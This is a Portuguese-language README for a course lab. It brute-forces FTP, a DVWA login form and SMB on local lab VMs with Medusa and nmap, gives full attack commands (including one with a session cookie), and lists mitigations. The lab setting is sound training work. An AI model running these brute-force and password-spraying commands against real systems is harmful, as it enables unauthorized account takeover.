# Medusa Brute Force Lab

Projeto pratico para o desafio da DIO: simulacao controlada de ataques de forca bruta com Kali Linux, Medusa, Metasploitable 2 e DVWA.

> Aviso etico: este material e exclusivamente educacional. Execute os testes somente em maquinas virtuais, redes de laboratorio ou ambientes em que voce tenha autorizacao explicita. Nao use estas tecnicas contra sistemas de terceiros.

## Objetivo

Este repositorio documenta um laboratorio local para entender:

- Ataques de forca bruta em FTP;
- Automacao de tentativas em formularios web no DVWA;
- Password spraying e enumeracao basica em SMB;
- Evidencias, validacao e medidas de mitigacao.

## Topologia do Laboratorio

| Componente | Funcao | Exemplo de IP |
| --- | --- | --- |
| Kali Linux | Maquina atacante/auditoria | `192.168.56.10` |
| Metasploitable 2 | Alvo vulneravel | `192.168.56.101` |
| DVWA | Aplicacao web vulneravel | `192.168.56.101/dvwa` |

Rede recomendada: VirtualBox em modo `Host-only Adapter`, isolada da internet para as VMs do laboratorio.

## Estrutura

```text
medusa-bruteforce-lab/
├── README.md
├── LICENSE
├── .gitignore
├── images/
│   ├── kali.png
│   ├── metasploitable.png
│   ├── ftp-attack.png
│   ├── dvwa-login.png
│   ├── smb-enum.png
│   └── medusa-success.png
├── wordlists/
│   ├── users.txt
│   ├── passwords.txt
│   └── smb-users.txt
├── scripts/
│   ├── ftp_test.sh
│   ├── smb_test.sh
│   └── dvwa_notes.txt
└── notes/
    ├── mitigation.md
    ├── network-setup.md
    └── lessons-learned.md
```

## Pre-requisitos

- VirtualBox instalado;
- VM Kali Linux;
- VM Metasploitable 2;
- DVWA configurado no ambiente vulneravel;
- Ferramentas no Kali:

```bash
sudo apt update
sudo apt install -y medusa nmap smbclient ftp curl
```

## 1. Configuracao da Rede

1. Desligue as VMs.
2. No VirtualBox, configure as duas VMs com `Host-only Adapter`.
3. Inicie Kali e Metasploitable 2.
4. Descubra os IPs:

```bash
ip addr
```

5. Teste conectividade a partir do Kali:

```bash
ping -c 4 192.168.56.101
```

6. Enumere os servicos principais:

```bash
nmap -sV -p 21,80,139,445 192.168.56.101
```

Mais detalhes estao em [notes/network-setup.md](notes/network-setup.md).

## 2. Teste FTP com Medusa

Wordlists usadas:

- [wordlists/users.txt](wordlists/users.txt)
- [wordlists/passwords.txt](wordlists/passwords.txt)

Execucao manual:

```bash
medusa -h 192.168.56.101 -U wordlists/users.txt -P wordlists/passwords.txt -M ftp -f -O results/ftp-medusa.txt
```

Ou usando o script:

```bash
chmod +x scripts/ftp_test.sh
./scripts/ftp_test.sh 192.168.56.101
```

Validacao de acesso, se uma credencial for encontrada:

```bash
ftp 192.168.56.101
```

Evidencia sugerida: salvar uma captura como `images/ftp-attack.png`.

## 3. DVWA: Formulario Web

O Medusa possui o modulo `web-form`, que permite configurar rota, parametros enviados e texto de falha. No DVWA, a sessao e o nivel de seguranca influenciam diretamente o resultado.

Fluxo recomendado:

1. Acesse `http://192.168.56.101/dvwa`.
2. Configure o DVWA para nivel `low`.
3. Capture ou identifique o cookie `PHPSESSID`.
4. Teste o formulario de brute force em `/dvwa/vulnerabilities/brute/`.
5. Ajuste `DENY-SIGNAL` conforme a mensagem exibida na sua instalacao.

Exemplo didatico:

```bash
SESSIONID="cole_o_phpsessid_aqui"

medusa -h 192.168.56.101 \
  -u admin \
  -P wordlists/passwords.txt \
  -M web-form \
  -m USER-AGENT:"Mozilla/5.0" \
  -m FORM:"/dvwa/vulnerabilities/brute/" \
  -m DENY-SIGNAL:"Username and/or password incorrect." \
  -m FORM-DATA:"get?username=&password=&Login=Login" \
  -m CUSTOM-HEADER:"Cookie: PHPSESSID=${SESSIONID}; security=low" \
  -f \
  -O results/dvwa-medusa.txt
```

Anotacoes adicionais: [scripts/dvwa_notes.txt](scripts/dvwa_notes.txt).

Evidencia sugerida: salvar uma captura como `images/dvwa-login.png`.

## 4. SMB: Enumeracao e Password Spraying

Enumere portas e scripts SMB:

```bash
nmap -p 139,445 --script smb-enum-users,smb-os-discovery 192.168.56.101
```

Teste manual de password spraying com uma senha por vez:

```bash
medusa -h 192.168.56.101 -U wordlists/smb-users.txt -p password -M smbnt -f -O results/smb-spray.txt
```

Ou usando o script:

```bash
chmod +x scripts/smb_test.sh
./scripts/smb_test.sh 192.168.56.101 password
```

Validacao opcional:

```bash
smbclient -L //192.168.56.101 -U usuario
```

Evidencia sugerida: salvar uma captura como `images/smb-enum.png`.

## Resultados Esperados

Durante os testes, registre:

- IPs das VMs;
- Servicos encontrados pelo Nmap;
- Comandos executados;
- Credenciais validas, se encontradas no laboratorio;
- Prints das telas e terminal;
- Medidas de mitigacao.

Crie a pasta `results/` localmente para armazenar saidas. Ela esta no `.gitignore` para evitar publicar credenciais acidentalmente.

```bash
mkdir -p results
```

## Medidas de Mitigacao

Resumo:

- Senhas fortes e unicas;
- Bloqueio temporario apos tentativas falhas;
- MFA onde for possivel;
- Desativar servicos desnecessarios;
- Atualizar servicos e sistemas;
- Monitorar logs de autenticacao;
- Restringir acesso por rede;
- Usar politicas contra senhas comuns.

Detalhes em [notes/mitigation.md](notes/mitigation.md).

## Evidencias

As imagens em `images/` sao placeholders. Substitua pelos seus prints reais:

- `kali.png`: tela da VM Kali;
- `metasploitable.png`: tela da VM Metasploitable;
- `ftp-attack.png`: execucao do Medusa contra FTP;
- `dvwa-login.png`: tela do DVWA;
- `smb-enum.png`: enumeracao SMB;
- `medusa-success.png`: exemplo de sucesso no laboratorio.

## Conclusao

O laboratorio demonstra que credenciais fracas continuam sendo um vetor de risco importante. A pratica reforca que ferramentas como Medusa devem ser usadas em auditorias autorizadas e que controles simples, como senhas fortes, limitacao de tentativas e monitoramento, reduzem bastante a exposicao.

## Referencias

- Kali Linux: https://www.kali.org/
- DVWA: https://github.com/digininja/DVWA
- Medusa: https://jmk-foofus.github.io/medusa/medusa.html
- Nmap Reference Guide: https://nmap.org/book/man.html
- GitHub Markdown: https://docs.github.com/pt/get-started/writing-on-github
